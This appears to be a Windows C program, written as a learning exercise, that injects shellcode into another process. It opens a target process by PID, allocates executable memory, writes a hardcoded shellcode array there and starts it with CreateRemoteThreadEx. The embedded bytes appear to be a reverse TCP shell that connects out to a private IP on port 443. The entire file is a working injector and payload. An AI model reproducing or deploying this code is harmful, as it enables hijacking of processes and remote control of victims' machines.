#include <windows.h> // which will make use of Win32 API.
#include <stdio.h>
#include <stdlib.h>

/* wake up samurai, we've got status symbols to setup
(as we get more advanced, we'll start incorporating macros instead) */
const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";
/*
* Steps followed:
* 1) get a handle to the process i.e. by attaching or by creating one.
* 2) allocate a buffer in the process memory with necessary permissions.
* 3) write the shellcode into the allocated buffer of process memory.
* 4) create a thread that will execute the shellcode.
*/
int main(int argc, char* argv[]) {

    /* declare and initialize some vars for later use */
    PVOID rBuffer = NULL;
    DWORD dwPID = NULL, dwTID = NULL;
    HANDLE hProcess = NULL, hThread = NULL;

    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }
    // 1. Getting the handle of the process.
    dwPID = atoi(argv[1]); // trying to get the handle to the process
    
    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (hProcess == NULL)
    {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process\n\\--0x%p\n", k, hProcess); // got the handle to the process

    // 2. allocate a region of memory to our target process.
    // Need to create some variable which is expected for VirtualAllocEx.
    unsigned char crowPuke[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
        "\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
        "\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
        "\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
        "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
        "\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
        "\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
        "\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
        "\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
        "\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x04\x71\x41\x54"
        "\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
        "\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
        "\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
        "\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
        "\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
        "\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
        "\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
        "\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
        "\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
        "\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
        "\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
        "\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
        "\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
        "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
        "\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
        "\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
        "\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
        "\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
        "\xf0\xb5\xa2\x56\xff\xd5";
    size_t crowPukeSize = sizeof(crowPuke);

    rBuffer = VirtualAllocEx(hProcess, NULL, crowPukeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, crowPukeSize);

    if (rBuffer == NULL)
    {
        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    // 3. write the content of shellcode into allocated buffer.
    WriteProcessMemory(hProcess, rBuffer, crowPuke, crowPukeSize, NULL);
    printf("%s wrote shellcode to allocated buffer\n", k);

    // 4. Create a thread to run the shellcode
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);

    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished, see you next time :>", k);




    return EXIT_SUCCESS;

}